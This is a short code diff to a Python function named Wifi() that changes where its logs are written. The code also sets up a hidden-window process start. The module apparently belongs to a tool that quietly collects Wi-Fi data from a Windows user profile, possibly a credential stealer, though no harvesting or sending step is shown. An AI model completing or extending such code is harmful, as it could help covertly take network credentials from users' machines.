@@ -9,7 +9,7 @@ from manager.logger import Log
 
 def Wifi():
     user = environ['USERPROFILE']
-    pathToLogs = f'{user}\\{config.pathToLogs}\\System'
+    pathToLogs = f'{config.pathToLogs}\\System'
     logs = []
     startupinfo = STARTUPINFO()
     startupinfo.dwFlags |= STARTF_USESHOWWINDOW
